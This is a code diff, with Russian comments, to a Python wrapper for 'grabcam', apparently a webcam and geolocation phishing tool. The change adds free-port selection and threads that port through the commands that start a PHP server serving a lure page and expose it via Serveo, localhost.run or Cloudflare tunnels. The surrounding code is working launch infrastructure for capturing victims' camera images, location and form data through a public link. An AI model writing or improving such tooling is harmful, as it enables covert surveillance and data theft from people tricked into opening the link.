@@ -22,6 +22,7 @@ _DEFAULT_FEATURES = {"camera": True, "geo": True, "form": True, "gallery": False
 _SCRIPT = os.path.join(_GRABCAM_DIR, "grabcam.sh")
 _SENDLINK = os.path.join(_GRABCAM_DIR, "sendlink")
 _PHP_PORT = 3333
+_PHP_PORTS_RANGE = (3333, 3334, 3335, 3336, 3337)  # первый свободный выбирается на запуск
 
 # Паттерны ссылок туннелей
 _SERVEO_LINK_RE = re.compile(
@@ -37,7 +38,18 @@ _CLOUDFLARE_LINK_RE = re.compile(
     re.IGNORECASE,
 )
 
-_state = {"proc": None, "proc_ssh": None, "proc_cloudflared": None, "link": None, "local_url": None, "running": False, "error": None, "method": None, "started_at": None}
+_state = {
+    "proc": None,
+    "proc_ssh": None,
+    "proc_cloudflared": None,
+    "link": None,
+    "local_url": None,
+    "running": False,
+    "error": None,
+    "method": None,
+    "started_at": None,
+    "php_port": None,
+}
 _lock = threading.Lock()
 
 
@@ -67,6 +79,14 @@ def _port_in_use(port: int) -> bool:
         return False
 
 
+def _find_free_port() -> int | None:
+    """Первый свободный порт из диапазона, чтобы не конфликтовать с другими сессиями."""
+    for p in _PHP_PORTS_RANGE:
+        if not _port_in_use(p):
+            return p
+    return None
+
+
 def _extract_serveo_link(text: str) -> str | None:
     """Извлекает ссылку Serveo из текста (serveo.net или serveousercontent.com)."""
     m = _SERVEO_LINK_RE.search(text)
@@ -85,8 +105,8 @@ def _read_link_from_file() -> str | None:
         return None
 
 
-def _worker_serveo():
-    """Запуск Serveo без интерактивного скрипта: PHP на 3333 + SSH туннель, парсинг ссылки из вывода SSH."""
+def _worker_serveo(port: int):
+    """Запуск Serveo: PHP + SSH туннель, парсинг ссылки из вывода SSH."""
     with _lock:
         _state["running"] = True
         _state["link"] = None
@@ -95,6 +115,7 @@ def _worker_serveo():
         _state["proc_ssh"] = None
         _state["local_url"] = None
         _state["started_at"] = time.time()
+        _state["php_port"] = port
 
     proc_php = None
     proc_ssh = None
@@ -103,7 +124,7 @@ def _worker_serveo():
     try:
         # 1) Запуск PHP-сервера в grabcam
         proc_php = subprocess.Popen(
-            ["php", "-S", f"127.0.0.1:{_PHP_PORT}"],
+            ["php", "-S", f"127.0.0.1:{port}"],
             cwd=_GRABCAM_DIR,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
@@ -128,7 +149,7 @@ def _worker_serveo():
             "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ServerAliveInterval=60",
             "-o", "ConnectTimeout=15",
-            "-R", "80:127.0.0.1:3333",
+            "-R", f"80:127.0.0.1:{port}",
             "serveo.net",
         ]
         for ssh_port in (22, 443):
@@ -236,8 +257,9 @@ def _worker_localhost_run():
     proc_ssh = None
     link = None
     try:
+        port = _state.get("php_port") or _PHP_PORT
         proc_php = subprocess.Popen(
-            ["php", "-S", f"127.0.0.1:{_PHP_PORT}"],
+            ["php", "-S", f"127.0.0.1:{port}"],
             cwd=_GRABCAM_DIR,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
@@ -256,7 +278,7 @@ def _worker_localhost_run():
         cmd = [
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ServerAliveInterval=60", "-o", "ConnectTimeout=20",
-            "-R", "80:127.0.0.1:3333", "nokey@localhost.run",
+            "-R", f"80:127.0.0.1:{port}", "nokey@localhost.run",
         ]
         try:
             proc_ssh = subprocess.Popen(
@@ -338,8 +360,9 @@ def _worker_cloudflared():
     proc_cf = None
     link = None
     try:
+        port = _state.get("php_port") or _PHP_PORT
         proc_php = subprocess.Popen(
-            ["php", "-S", f"127.0.0.1:{_PHP_PORT}"],
+            ["php", "-S", f"127.0.0.1:{port}"],
             cwd=_GRABCAM_DIR,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
@@ -357,7 +380,7 @@ def _worker_cloudflared():
         _ensure_serveo_payload_ready()
         try:
             proc_cf = subprocess.Popen(
-                ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{_PHP_PORT}"],
+                ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
                 text=True,
@@ -456,13 +479,14 @@ def _refresh_payload(link: str = "http://127.0.0.1:3333") -> None:
 
 def _ensure_serveo_payload_ready() -> None:
     """Создаёт/обновляет index2.html и index.php с плейсхолдером и текущими опциями."""
-    _refresh_payload("http://127.0.0.1:3333")
+    port = _state.get("php_port") or _PHP_PORT
+    _refresh_payload(f"http://127.0.0.1:{port}")
     tpl_php = os.path.join(_GRABCAM_DIR, "template.php")
     index_php = os.path.join(_GRABCAM_DIR, "index.php")
     if os.path.isfile(tpl_php):
         try:
             with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
-                content = f.read().replace("forwarding_link", "http://127.0.0.1:3333")
+                content = f.read().replace("forwarding_link", f"http://127.0.0.1:{port}")
             with open(index_php, "w", encoding="utf-8") as f:
                 f.write(content)
         except OSError:
@@ -493,6 +517,7 @@ def _worker_php_only(port: int = _PHP_PORT):
         _state["proc"] = None
         _state["link"] = None
         _state["started_at"] = time.time()
+        _state["php_port"] = port
     proc = None
     try:
         proc = subprocess.Popen(
@@ -545,7 +570,11 @@ class ToolGrabcam(ToolBase):
                 json.dump(options, f, ensure_ascii=False, indent=2)
         except OSError:
             pass
-        _refresh_payload("http://127.0.0.1:3333")
+        # Выбираем порт под сессию (первый свободный).
+        port = _find_free_port() or _PHP_PORT
+        with _lock:
+            _state["php_port"] = port
+        _refresh_payload(f"http://127.0.0.1:{port}")
 
         with _lock:
             _state["error"] = None
@@ -559,7 +588,6 @@ class ToolGrabcam(ToolBase):
         if method == "php_only":
             if not os.path.isdir(_GRABCAM_DIR):
                 return {"success": False, "error": "Папка не найдена: tools/grabcam"}
-            port = _PHP_PORT
             if _port_in_use(port):
                 return {"success": False, "error": f"Порт {port} занят. Остановите другой сервер или выберите туннель."}
             thread = threading.Thread(target=_worker_php_only, args=(port,), daemon=True)
@@ -575,8 +603,8 @@ class ToolGrabcam(ToolBase):
         elif method == "cloudflared":
             if not _cloudflared_available():
                 return {"success": False, "error": "cloudflared не найден. Скачайте: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/ (часто работает в РФ)."}
-            if _port_in_use(_PHP_PORT):
-                return {"success": False, "error": f"Порт {_PHP_PORT} занят."}
+            if _port_in_use(port):
+                return {"success": False, "error": f"Порт {port} занят."}
             thread = threading.Thread(target=_worker_cloudflared, daemon=True)
             thread.start()
             return {"success": True, "started": True, "message": "Запуск PHP и Cloudflare Tunnel… Ссылка появится через 5–15 сек."}
@@ -584,14 +612,16 @@ class ToolGrabcam(ToolBase):
             # serveo или localhost_run — нужен SSH
             if not _ssh_available():
                 return {"success": False, "error": "SSH не найден. Установите openssh-client (apt install openssh-client)."}
-            if _port_in_use(_PHP_PORT):
-                return {"success": False, "error": f"Порт {_PHP_PORT} занят."}
+            if _port_in_use(port):
+                return {"success": False, "error": f"Порт {port} занят."}
             if method == "localhost_run":
+                with _lock:
+                    _state["php_port"] = port
                 thread = threading.Thread(target=_worker_localhost_run, daemon=True)
                 thread.start()
                 return {"success": True, "started": True, "message": "Запуск PHP и localhost.run… Ссылка появится через 10–30 сек. (рекомендуется для РФ.)"}
             else:
-                thread = threading.Thread(target=_worker_serveo, daemon=True)
+                thread = threading.Thread(target=_worker_serveo, args=(port,), daemon=True)
                 thread.start()
                 return {"success": True, "started": True, "message": "Запуск PHP и Serveo… Ссылка появится через 10–25 сек."}
 
@@ -637,6 +667,7 @@ class ToolGrabcam(ToolBase):
             _state["error"] = None
             _state["method"] = None
             _state["started_at"] = None
+            _state["php_port"] = None
         return True, "Остановлено."
 
     def get_run_status(self) -> dict:
